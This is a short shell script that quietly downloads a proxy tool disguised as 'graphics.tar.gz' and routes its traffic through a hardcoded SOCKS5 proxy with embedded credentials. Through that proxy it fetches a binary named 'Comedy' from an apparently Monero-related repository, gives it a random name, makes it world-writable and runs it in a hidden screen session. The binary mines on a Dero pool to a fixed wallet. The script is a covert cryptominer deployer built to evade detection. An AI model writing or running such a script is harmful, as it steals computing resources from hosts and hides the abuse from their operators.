
sudo apt install screen -y > /dev/null 2>&1

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.155.69.201:6406
socks5_username = ingfoingfo
socks5_password = maszZeehh
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo " "
echo " "


GOGO=$(shuf -i 10000-999999999 -n 1)
MARKONAH=$(shuf -i 10000-9999999999 -n 1)


./graftcp/graftcp wget https://github.com/catursawah/xmr/raw/main/Comedy

mv -f Comedy $GOGO
chmod 777 $GOGO

./graftcp/graftcp screen -S $MARKONAH -dm ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.MARKONAH